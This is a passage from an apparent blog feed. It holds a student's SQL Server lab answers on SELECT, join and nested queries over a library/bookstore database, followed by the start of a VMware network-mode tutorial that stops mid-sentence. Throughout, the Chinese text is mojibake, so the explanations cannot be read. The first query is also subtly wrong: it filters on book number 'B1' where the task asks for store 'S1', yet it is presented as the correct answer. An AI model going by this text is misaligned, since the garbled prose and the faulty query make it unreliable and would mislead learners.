æ•°æ®åº“ï¼Œæ­£ç¡®åˆ†æç”¨æˆ·æŸ¥è¯¢è¦æ±‚ï¼Œè®¾è®¡å„ç§åµŒå¥—æŸ¥è¯¢å’Œé›†åˆ</p><p>æŸ¥è¯¢ã€‚</p></li></ol><h4 id="å®ç°ä»ªå™¨è®¾å¤‡"><a href="#å®ç°ä»ªå™¨è®¾å¤‡" class="headerlink" title="å®ç°ä»ªå™¨è®¾å¤‡"></a>å®ç°ä»ªå™¨è®¾å¤‡</h4><ol><li>å­¦ç”Ÿæ¯äººä¸€å°PCæœº</li><li>å·²å®‰è£…SQL Server</li></ol><h4 id="é¢˜ç›®-2ï¼šå®éªŒå†…å®¹"><a href="#é¢˜ç›®-2ï¼šå®éªŒå†…å®¹" class="headerlink" title="é¢˜ç›® 2ï¼šå®éªŒå†…å®¹"></a>é¢˜ç›® 2ï¼šå®éªŒå†…å®¹</h4><ol><li><p>æ£€ç´¢ L1 ä»ä¹¦åº— S1 è´­ä¹°çš„å›¾ä¹¦çš„ä¹¦å·åŠå…¶å†Œæ•°ï¼›</p></li><li><p>æ£€ç´¢é¦†å€åœ¨â€œä¸Šæµ·â€çš„å›¾ä¹¦é¦†åŠå…¶ç”µè¯å·ç ï¼›</p></li><li><p>æ£€ç´¢ L4 æ”¶è—å›¾ä¹¦çš„ä¹¦åï¼›</p></li><li><p>æ£€ç´¢ S3 å‘è¡Œçš„å›¾ä¹¦ä¹¦ååŠæ•°é‡ï¼›</p></li><li><p>æ£€ç´¢æ”¶è—å›¾ä¹¦â€œæ•°æ®åº“è®¾è®¡â€çš„é¦†åã€‚</p></li><li><p>æ£€ç´¢æ²¡æœ‰è´­ä¹°ä¸Šæµ·æ–°åä¹¦åº—å‡ºå”®çš„å›¾ä¹¦çš„å›¾ä¹¦é¦†å· LNOã€‚</p></li><li><p>æ£€ç´¢è´­ä¹°å›¾ä¹¦ B4 æœ€å¤šçš„å›¾ä¹¦é¦†åï¼›</p></li><li><p>å–å‡ºå·²ç»å‘è¡Œçš„å›¾ä¹¦ä¸­æœ€è´µå’Œæœ€ä¾¿å®œçš„ä¹¦çš„ä¹¦åå’Œå®šä»·ï¼›</p></li><li><p>æ£€ç´¢é”€å”®å›¾ä¹¦æ•°é‡æœ€å¤šçš„ä¹¦åº—åï¼›</p></li><li><p>è¾“å‡ºå¦‚ä¸‹æŠ¥è¡¨</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220402085946794-16488749715882.png"></p></li></ol><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p><blockquote><ol><li><p>å†…è¿æ¥ã€å·¦å¤–è¿æ¥å’Œå³å¤–è¿æ¥çš„å«ä¹‰åŠä¸»è¦æ–¹æ³•ã€‚</p></li><li><p>è¾“å…¥ SQL è¯­å¥æ—¶åº”æ³¨æ„ï¼Œè¯­å¥ä¸­å‡ä½¿ç”¨è¥¿æ–‡æ“ä½œç¬¦å·ã€‚</p></li><li><p>å­å¥ WHEREï¼ˆæ¡ä»¶ï¼‰è¡¨ç¤ºå…ƒç»„ç­›é€‰æ¡ä»¶ï¼Œå­å¥ HAVINGï¼ˆæ¡ä»¶ï¼‰è¡¨ç¤ºåˆ†ç»„é€‰</p></li></ol><p> æ‹©æ¡ä»¶ã€‚</p><ol start="4"><li>å­å¥ HAVINGï¼ˆæ¡ä»¶ï¼‰å¿…é¡»å’Œ GROUP BYï¼ˆåˆ†ç»„å­—æ®µï¼‰å­å¥é…åˆä½¿ç”¨</li></ol></blockquote><ul><li><p>æ£€ç´¢ L1 ä»ä¹¦åº— S1 è´­ä¹°çš„å›¾ä¹¦çš„ä¹¦å·åŠå…¶å†Œæ•°</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> BNO<span class="token punctuation">,</span>QTY<span class="token keyword">FROM</span> LBSBF<span class="token keyword">WHERE</span> LNO<span class="token operator">=</span><span class="token string">'L1'</span> <span class="token operator">AND</span> BNO<span class="token operator">=</span><span class="token string">'B1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220402090429505-16488749715886.png"></p><blockquote><p>ç®€å•çš„å•è¡¨æŸ¥è¯¢ ï¼Œæ ¹æ®è¦æ±‚æŒ‡å®šBNO,QTYä¸¤åˆ—å¹¶ç”¨whereè¯­å¥æŸ¥è¯¢æ»¡è¶³æŒ‡å®šæ¡ä»¶çš„å…ƒç»„ã€‚</p></blockquote></li><li><p>æ£€ç´¢é¦†å€åœ¨â€œä¸Šæµ·â€çš„å›¾ä¹¦é¦†åŠå…¶ç”µè¯å·ç </p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LNAME<span class="token punctuation">,</span>TEL <span class="token keyword">FROM</span> LBF <span class="token keyword">WHERE</span> CITY<span class="token operator">=</span><span class="token string">'ä¸Šæµ·'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220401184658130-16488749715871.png"></p><blockquote><p>å’Œä¸Šé¢˜ä¸€æ ·ã€‚</p></blockquote></li><li><p>æ£€ç´¢ L4 æ”¶è—å›¾ä¹¦çš„ä¹¦å</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> BBF<span class="token punctuation">.</span>BNAME <span class="token keyword">FROM</span> BBF<span class="token punctuation">,</span>LBSBF <span class="token keyword">WHERE</span> LBSBF<span class="token punctuation">.</span>LNO<span class="token operator">=</span><span class="token string">'L4'</span> <span class="token operator">AND</span> LBSBF<span class="token punctuation">.</span>BNO<span class="token operator">=</span>BBF<span class="token punctuation">.</span>BNO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220401185204575-16488749715883.png"></p><blockquote><p>è¿æ¥æŸ¥è¯¢ï¼Œå°†BBFå’ŒLBSBFè¿åœ¨ä¸€èµ·æŸ¥è¯¢ï¼Œå¹¶æ ¹æ®æ¡ä»¶æ·»åŠ whereè¯­å¥ã€‚</p></blockquote></li><li><p>æ£€ç´¢S3å‘è¡Œçš„å›¾ä¹¦ä¹¦ååŠæ•°é‡</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> BNAME<span class="token punctuation">,</span>QTY <span class="token keyword">FROM</span> BBF<span class="token punctuation">,</span>LBSBF <span class="token keyword">WHERE</span> LBSBF<span class="token punctuation">.</span>SNO<span class="token operator">=</span><span class="token string">'S3'</span> <span class="token operator">AND</span> BBF<span class="token punctuation">.</span>BNO<span class="token operator">=</span>LBSBF<span class="token punctuation">.</span>BNO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220402103915456-16488749715884.png"></p><blockquote><p>åŒä¸Šé¢˜ä¸€æ ·</p></blockquote></li><li><p>æ£€ç´¢æ”¶è—å›¾ä¹¦â€œæ•°æ®åº“è®¾è®¡â€çš„é¦†åã€‚</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LNAME <span class="token keyword">FROM</span> BBF<span class="token punctuation">,</span>LBSBF<span class="token punctuation">,</span>LBF <span class="token keyword">WHERE</span> BBF<span class="token punctuation">.</span>BNAME<span class="token operator">=</span><span class="token string">'æ•°æ®åº“è®¾è®¡'</span> <span class="token operator">AND</span> BBF<span class="token punctuation">.</span>BNO<span class="token operator">=</span>LBSBF<span class="token punctuation">.</span>BNO <span class="token operator">AND</span> LBF<span class="token punctuation">.</span>LNO<span class="token operator">=</span>LBSBF<span class="token punctuation">.</span>LNO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220402104131819-16488749715885.png"></p><blockquote><p>ä¹Ÿè¿˜æ˜¯è¿è¡¨æŸ¥è¯¢ï¼Œåªä¸è¿‡å˜æˆäº†ä¸‰ä¸ªè¡¨</p></blockquote></li><li><p>æ£€ç´¢æ²¡æœ‰è´­ä¹°ä¸Šæµ·æ–°åä¹¦åº—å‡ºå”®çš„å›¾ä¹¦çš„å›¾ä¹¦é¦†å· LNOã€‚</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LNO<span class="token punctuation">,</span>LNAME <span class="token keyword">FROM</span> LBF <span class="token keyword">WHERE</span> LNO <span class="token operator">NOT</span> <span class="token operator">IN</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> LBSBF<span class="token punctuation">.</span>LNO <span class="token keyword">FROM</span> LBSBF<span class="token punctuation">,</span>SBF <span class="token keyword">WHERE</span> LBSBF<span class="token punctuation">.</span>SNO<span class="token operator">=</span>SBF<span class="token punctuation">.</span>SNO <span class="token operator">AND</span> SBF<span class="token punctuation">.</span>SNAME<span class="token operator">=</span><span class="token string">'ä¸Šæµ·æ–°åä¹¦åº—'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220402110012645-16488749715887.png"></p><blockquote><p>åµŒå¥—æŸ¥è¯¢ï¼Œæ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œè¦æ‰¾åˆ°æ²¡æœ‰è´­ä¹°ä¸Šæµ·æ–°åä¹¦åº—å‡ºå”®çš„å›¾ä¹¦ï¼Œç”¨NOT INå³å¯ï¼Œåé¢å†è·Ÿä¸ŠSQLè¯­å¥ã€‚</p></blockquote></li><li><p>æ£€ç´¢è´­ä¹°å›¾ä¹¦ B4 æœ€å¤šçš„å›¾ä¹¦é¦†åï¼š</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LNAME <span class="token keyword">FROM</span> LBF <span class="token keyword">WHERE</span> LNO <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> LNO               <span class="token keyword">FROM</span> LBSBF <span class="token keyword">WHERE</span> QTY <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>QTY<span class="token punctuation">)</span> <span class="token keyword">FROM</span> LBSBF <span class="token keyword">WHERE</span> BNO<span class="token operator">=</span><span class="token string">'B4'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220402115724350-16488749715888.png"></p><blockquote><p>å…ˆé€šè¿‡åµŒå¥—æŸ¥è¯¢å’Œèšé›†å‡½æ•°åœ¨LBSBFè¡¨ä¸­æŸ¥åˆ°è´­ä¹°å›¾ä¹¦ B4 æœ€å¤šçš„å›¾ä¹¦é¦†IDå·ï¼Œç„¶åæ ¹æ®IDæŸ¥LBFæ‰¾åˆ°åå­—</p></blockquote></li><li><p>å–å‡ºå·²ç»å‘è¡Œçš„å›¾ä¹¦ä¸­æœ€è´µå’Œæœ€ä¾¿å®œçš„ä¹¦çš„ä¹¦åå’Œå®šä»·ï¼š</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> BNAME<span class="token punctuation">,</span>PRICE <span class="token keyword">FROM</span> BBF <span class="token keyword">WHERE</span> PRICE<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>PRICE<span class="token punctuation">)</span> <span class="token keyword">FROM</span> BBF<span class="token punctuation">)</span> <span class="token operator">OR</span> PRICE<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">MIN</span><span class="token punctuation">(</span>PRICE<span class="token punctuation">)</span> <span class="token keyword">FROM</span> BBF<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220401190237855-16488749715889.png"></p><blockquote><p>å’Œä¸Šé¢˜åŒç†</p></blockquote></li><li><p>æ£€ç´¢é”€å”®å›¾ä¹¦æ•°é‡æœ€å¤šçš„ä¹¦åº—åï¼š</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> SNAME <span class="token keyword">FROM</span> SBF <span class="token keyword">WHERE</span> SNO <span class="token operator">IN</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> SNO              <span class="token keyword">FROM</span> LBSBF <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> SNO <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token function">SUM</span><span class="token punctuation">(</span>QTY<span class="token punctuation">)</span> <span class="token keyword">DESC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220402120103405-164887497158810.png"></p><blockquote><p>è¿˜æ˜¯åµŒå¥—æŸ¥è¯¢ï¼Œä½†åªè¦æœ€å¤šçš„é‚£ä¸ªã€‚å…ˆç”¨group byåˆ†ç±»åŠ ä¸Šèšé›†å‡½æ•°æŸ¥åˆ°QTYæœ€å¤šçš„ï¼Œå†é™åºæ’åˆ—å–ç¬¬ä¸€ä¸ªçš„SNOï¼Œå†æ ¹æ®SNOæŸ¥SBFè¡¨å¾—åˆ°ä¹¦åº—å</p></blockquote></li><li><p>è¾“å‡ºå¦‚ä¸‹æŠ¥è¡¨</p><p>SQLè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> SNAME <span class="token keyword">AS</span> <span class="token string">'ä¹¦åº—'</span><span class="token punctuation">,</span>LNAME <span class="token keyword">AS</span> <span class="token string">'å›¾ä¹¦é¦†'</span><span class="token punctuation">,</span>BNAME <span class="token keyword">AS</span><span class="token string">'å›¾ä¹¦'</span><span class="token punctuation">,</span>QTY <span class="token keyword">AS</span> <span class="token string">'æ•°é‡'</span> <span class="token keyword">FROM</span> LBSBF<span class="token punctuation">,</span>SBF<span class="token punctuation">,</span>BBF<span class="token punctuation">,</span>LBF <span class="token keyword">WHERE</span> SBF<span class="token punctuation">.</span>SNO<span class="token operator">=</span>LBSBF<span class="token punctuation">.</span>SNO <span class="token operator">AND</span> LBF<span class="token punctuation">.</span>LNO<span class="token operator">=</span>LBSBF<span class="token punctuation">.</span>LNO <span class="token operator">AND</span> BBF<span class="token punctuation">.</span>BNO<span class="token operator">=</span>LBSBF<span class="token punctuation">.</span>BNO <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»“æœå›æ˜¾ï¼š</p><p><img src="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/image-20220402120407261-164887497158811.png"></p></li></ul><h4 id="æ€è€ƒé¢˜"><a href="#æ€è€ƒé¢˜" class="headerlink" title="æ€è€ƒé¢˜"></a>æ€è€ƒé¢˜</h4><ol><li><p>å¦‚ä½•æé«˜æ•°æ®æŸ¥è¯¢å’Œè¿æ¥é€Ÿåº¦ã€‚</p><blockquote><p>å¯¹æŸ¥è¯¢è¿›è¡Œä¼˜åŒ–ï¼Œåº”å°½é‡é¿å…å…¨è¡¨æ‰«æï¼Œé¦–å…ˆåº”è€ƒè™‘åœ¨ where åŠ order by æ¶‰åŠçš„åˆ—ä¸Šå»ºç«‹ç´¢å¼•ã€‚</p><p>åº”å°½é‡é¿å…åœ¨ where å­å¥ä¸­ä½¿ç”¨!=æˆ–&lt;&gt;æ“ä½œç¬¦ï¼Œå¦åˆ™å°†å¼•æ“æ”¾å¼ƒä½¿ç”¨ç´¢å¼•è€Œè¿›è¡Œå…¨è¡¨æ‰«æã€‚</p><p>in å’Œ not in ä¹Ÿè¦æ…ç”¨ï¼Œå¦åˆ™ä¼šå¯¼è‡´å…¨è¡¨æ‰«æã€‚</p><p>åº”å°½é‡é¿å…åœ¨ where å­å¥ä¸­å¯¹å­—æ®µè¿›è¡Œè¡¨è¾¾å¼æ“ä½œï¼Œè¿™å°†å¯¼è‡´å¼•æ“æ”¾å¼ƒä½¿ç”¨ç´¢å¼•è€Œè¿›è¡Œå…¨è¡¨æ‰«æã€‚</p><p>å°½é‡ä½¿ç”¨æ•°å­—å‹å­—æ®µï¼Œè‹¥åªå«æ•°å€¼ä¿¡æ¯çš„å­—æ®µå°½é‡ä¸è¦è®¾è®¡ä¸ºå­—ç¬¦å‹ï¼Œè¿™ä¼šé™ä½æŸ¥è¯¢å’Œè¿æ¥çš„æ€§èƒ½ï¼Œå¹¶ä¼šå¢åŠ å­˜å‚¨å¼€é”€ã€‚è¿™æ˜¯å› ä¸ºå¼•æ“åœ¨å¤„ç†æŸ¥è¯¢å’Œè¿æ¥æ—¶ä¼šé€ä¸ªæ¯”è¾ƒå­—ç¬¦ä¸²ä¸­æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œå¯¹äºæ•°å­—å‹è€Œè¨€åªéœ€è¦æ¯”è¾ƒä¸€æ¬¡å°±å¤Ÿäº†ã€‚</p></blockquote></li><li><p>è¯•æ¯”è¾ƒè¿æ¥æŸ¥è¯¢å’ŒåµŒå¥—æŸ¥è¯¢</p><blockquote><p>åµŒå¥—æŸ¥è¯¢æ˜¯åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå­æŸ¥è¯¢æˆ–å­æŸ¥è¯¢çš„selectè¯­å¥ã€‚åœ¨å¤–éƒ¨æŸ¥è¯¢ä¸­åŒ…å«å†…éƒ¨æŸ¥è¯¢çš„å¦ä¸€ä¸ªå­æŸ¥è¯¢æ˜¯SQLè¯­å¥çš„æ‰©å±•ã€‚</p><p>ä¸€ä¸ªæŸ¥è¯¢åŒæ—¶æ¶‰åŠä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¡¨ï¼Œåˆ™ç§°ä¹‹ä¸ºè¿æ¥æŸ¥è¯¢ï¼›è¿æ¥æ“ä½œæŸ¥è¯¢å­˜å‚¨åœ¨å¤šä¸ªè¡¨ä¸­çš„ä¸åŒå®ä½“çš„ä¿¡æ¯ã€‚</p><p>å¯¹äºæ•°æ®é‡å¤šçš„ç”¨è¿æ¥æŸ¥è¯¢æ›´å¿«ï¼Œå› ä¸ºåµŒå¥—æŸ¥è¯¢ä¼šå¤šæ¬¡éå†æ‰€æœ‰çš„æ•°æ®ï¼Œè€Œè¿æ¥æŸ¥è¯¢åªä¼šéå†ä¸€æ¬¡ã€‚</p><p>åµŒå¥—æŸ¥è¯¢ä¸ä¸€å®šéœ€è¦ä¸¤ä¸ªè¡¨æœ‰å…³è”å­—æ®µï¼Œè€Œè¿æ¥æŸ¥è¯¢å¿…é¡»æœ‰å­—æ®µå…³è”ã€‚</p></blockquote></li><li><p>ä½¿ç”¨ GROUP BY &lt;æ¡ä»¶&gt;å­å¥åï¼Œè¯­å¥ä¸­çš„ç»Ÿè®¡å‡½æ•°çš„è¿è¡Œç»“æœæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</p><blockquote><p>å°†ç»Ÿè®¡å‡½æ•°ä½œç”¨åœ¨æ»¡è¶³æ¡ä»¶çš„å¯¹è±¡ä¸Šï¼Œç»†åŒ–äº†ç»Ÿè®¡å‡½æ•°çš„ä½œç”¨å¯¹è±¡ã€‚åˆ†ç»„åç»Ÿè®¡å‡½æ•°å°†ä½œç”¨äºæ¯ä¸€ä¸ªç»„ã€‚</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> School </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®éªŒ </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMwareä½¿ç”¨è¯´æ˜</title>
      <link href="/2022/03/31/vmware-shi-yong-shuo-ming/"/>
      <url>/2022/03/31/vmware-shi-yong-shuo-ming/</url>
      
        <content type="html"><![CDATA[<h2 id="ç½‘ç»œæ¨¡å¼"><a href="#ç½‘ç»œæ¨¡å¼" class="headerlink" title="ç½‘ç»œæ¨¡å¼"></a>ç½‘ç»œæ¨¡å¼</h2><p>æˆ‘ä»¬äº†è§£ä¸€ä¸‹VMware 3ç§ç½‘ç»œæ¨¡å¼çš„åŠŸèƒ½å’Œé€šä¿¡è§„åˆ™</p><p>æˆ‘ä»¬é¦–å…ˆè¯´ä¸€ä¸‹VMwareçš„å‡ ä¸ªè™šæ‹Ÿè®¾å¤‡</p><p>VMnet0ï¼šç”¨äºè™šæ‹Ÿæ¡¥æ¥ç½‘ç»œä¸‹çš„è™šæ‹Ÿäº¤æ¢æœº</p><p>VMnet1ï¼šç”¨äºè™šæ‹ŸHost-Onlyç½‘ç»œä¸‹çš„è™šæ‹Ÿäº¤æ¢æœº</p><p>VMnet8ï¼šç”¨äºè™šæ‹ŸNATç½‘ç»œä¸‹çš„è™šæ‹Ÿäº¤æ¢æœº</p><p>VMware Network Adepter VMnet1ï¼šHostç”¨äºä¸Host-Onlyè™šæ‹Ÿç½‘ç»œè¿›è¡Œé€šä¿¡çš„è™šæ‹Ÿç½‘å¡</p><p>VMware Network Adepter VMnet8ï¼šHostç”¨äºä¸NATè™šæ‹Ÿç½‘ç»œè¿›è¡Œé€šä¿¡çš„è™šæ‹Ÿç½‘å¡</p><p>å®‰è£…äº†VMwareè™šæ‹Ÿæœºåï¼Œä¼šåœ¨ç½‘ç»œè¿æ¥å¯¹è¯æ¡†ä¸­å¤šå‡ºä¸¤ä¸ªè™šæ‹Ÿç½‘å¡ï¼ˆVMnetæ˜¯æˆ‘æ–°æ·»åŠ çš„ï¼‰ï¼Œå¦‚å›¾ï¼š</p><p><img src="/2022/03/31/vmware-shi-yong-shuo-ming/image-20220331150459041.png"></p><p>ä¹Ÿå¯ä»¥æ–°æ·»åŠ ç½‘å¡</p><p><img src="/2022/03/31/vmware-shi-yong-shuo-ming/image-20220331150548164.png"></p><h4 id="æ¡¥æ¥ç½‘ç»œï¼ˆBridged-Networkingï¼‰ï¼š"><a href="#æ¡¥æ¥ç½‘ç»œï¼ˆBridged-Networkingï¼‰ï¼š" class="headerlink" title="æ¡¥æ¥ç½‘ç»œï¼ˆBridged Networkingï¼‰ï¼š"></a>æ¡¥æ¥ç½‘ç»œï¼ˆBridged Networkingï¼‰ï¼š</h4><p>æ¡¥æ¥ç½‘ç»œæ˜¯æŒ‡æœ¬åœ°ç‰©ç†ç½‘å¡å’Œè™šæ‹Ÿç½‘å¡é€šè¿‡VMnet0è™šæ‹Ÿäº¤æ¢æœºè¿›è¡Œæ¡¥æ¥ï¼Œç‰©ç†ç½‘å¡å’Œè™šæ‹Ÿç½‘å¡åœ¨æ‹“æ‰‘å›¾ä¸Šå¤„äºåŒç­‰åœ°ä½ï¼ˆè™šæ‹Ÿç½‘å¡æ—¢ä¸æ˜¯Adepter VMnet1ä¹Ÿä¸æ˜¯Adepter VMnet8ï¼‰ã€‚</p><p><img src="/2022/03/31/vmware-shi-yong-shuo-ming/clip_image001.jpg" alt="æ¡¥æ¥ç½‘ç»œæ‹“æ‰‘å›¾"></p><p>â€‹    </p><p>é‚£ä¹ˆç‰©ç†ç½‘å¡å’Œè™šæ‹Ÿç½‘å¡å°±ç›¸å½“äºå¤„äºåŒä¸€ä¸ªç½‘æ®µï¼Œè™šæ‹Ÿäº¤æ¢æœºå°±ç›¸å½“äºä¸€å°ç°å®ç½‘ç»œä¸­çš„äº¤æ¢æœºã€‚æ‰€ä»¥ä¸¤ä¸ªç½‘å¡çš„IPåœ°å€ä¹Ÿè¦è®¾ç½®ä¸ºåŒä¸€ç½‘æ®µã€‚</p><h4 id="NATæ¨¡å¼ï¼š"><a href="#NATæ¨¡å¼ï¼š" class="headerlink" title="NATæ¨¡å¼ï¼š"></a>NATæ¨¡å¼ï¼š</h4><p>åœ¨NATç½‘ç»œä¸­ï¼Œä¼šç”¨åˆ°VMware Network Adepter VMnet8è™šæ‹Ÿç½‘å¡ï¼Œä¸»æœºä¸Šçš„VMware Network Adepter VMnet8è™šæ‹Ÿç½‘å¡è¢«ç›´æ¥è¿æ¥åˆ°VMnet8è™šæ‹Ÿäº¤æ¢æœºä¸Šä¸è™šæ‹Ÿç½‘å¡è¿›è¡Œé€šä¿¡ã€‚</p><p><img src="/2022/03/31/vmware-shi-yong-shuo-ming/clip_image001-16487105950802.jpg" alt="NATç½‘ç»œæ¨¡å¼"></p><p>VMware Network Adepter VMnet8è™šæ‹Ÿç½‘å¡çš„ä½œç”¨ä»…é™äºå’ŒVMnet8ç½‘æ®µè¿›è¡Œé€šä¿¡ï¼Œå®ƒä¸ç»™VMnet8ç½‘æ®µæä¾›è·¯ç”±åŠŸèƒ½ï¼Œæ‰€ä»¥è™šæ‹Ÿæœºè™šæ‹Ÿä¸€ä¸ªNATæœåŠ¡å™¨ï¼Œä½¿è™šæ‹Ÿç½‘å¡å¯ä»¥è¿ æ¥åˆ°Internetã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç«¯å£æ˜ å°„åŠŸèƒ½ï¼Œè®©è®¿é—®ä¸»æœº80ç«¯å£çš„è¯·æ±‚æ˜ å°„åˆ°è™šæ‹Ÿæœºçš„80ç«¯å£ä¸Šã€‚</p><p>VMware Network Adepter VMnet8è™šæ‹Ÿç½‘å¡çš„IPåœ°å€æ˜¯åœ¨å®‰è£…VMwareæ—¶ç”±ç³»ç»ŸæŒ‡å®šç”Ÿæˆçš„ï¼Œæˆ‘ä»¬ä¸è¦ä¿®æ”¹è¿™ä¸ªæ•°å€¼ï¼Œå¦åˆ™ä¼šä½¿ä¸»æœºå’Œè™šæ‹Ÿæœºæ— æ³•é€šä¿¡ã€‚</p><p>è™šæ‹Ÿå‡ºæ¥çš„ç½‘æ®µå’ŒNATæ¨¡å¼è™šæ‹Ÿç½‘å¡çš„ç½‘æ®µæ˜¯ä¸€æ ·çš„ï¼Œéƒ½ä¸º192.168.111.Xï¼ŒåŒ…æ‹¬NATæœåŠ¡å™¨çš„IPåœ°å€ä¹Ÿæ˜¯è¿™ä¸ªç½‘æ®µã€‚åœ¨å®‰è£…VMwareä¹‹ååŒæ ·ä¼šç”Ÿæˆä¸€ä¸ªè™šæ‹ŸDHCPæœåŠ¡å™¨ï¼Œä¸ºNATæœåŠ¡å™¨åˆ†é…IPåœ°å€ã€‚<br> å½“ä¸»æœºå’Œè™šæ‹Ÿæœºè¿›è¡Œé€šä¿¡çš„æ—¶å€™å°±ä¼šè°ƒç”¨VMware Network Adepter VMnet8è™šæ‹Ÿç½‘å¡ï¼Œå› ä¸ºä»–ä»¬éƒ½åœ¨ä¸€ä¸ªç½‘æ®µï¼Œæ‰€ä»¥é€šä¿¡å°±ä¸æˆé—®é¢˜äº†ã€‚</p><p>å®é™…ä¸Šï¼ŒVMware Network Adepter VMnet8è™šæ‹Ÿç½‘å¡çš„ä½œç”¨å°±æ˜¯ä¸ºä¸»æœºå’Œè™šæ‹Ÿæœºçš„é€šä¿¡æä¾›ä¸€ä¸ªæ¥å£ï¼Œå³ä½¿ä¸»æœºçš„ç‰©ç†ç½‘å¡è¢«å…³é—­ï¼Œè™šæ‹Ÿæœºä»ç„¶å¯ä»¥è¿æ¥åˆ°Internetï¼Œä½†æ˜¯ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´å°±ä¸èƒ½äº’è®¿äº†ã€‚</p><h4 id="Host-Onlyæ¨¡å¼ï¼š"><a href="#Host-Onlyæ¨¡å¼ï¼š" class="headerlink" title="Host-Onlyæ¨¡å¼ï¼š"></a>Host-Onlyæ¨¡å¼ï¼š</h4><p>åœ¨Host-Onlyæ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿç½‘ç»œæ˜¯ä¸€ä¸ªå…¨å°é—­çš„ç½‘ç»œï¼Œå®ƒå”¯ä¸€èƒ½å¤Ÿè®¿é—®çš„å°±æ˜¯ä¸»æœºã€‚å…¶å®Host-Onlyç½‘ç»œå’ŒNATç½‘ç»œå¾ˆç›¸ä¼¼ï¼Œä¸åŒçš„ 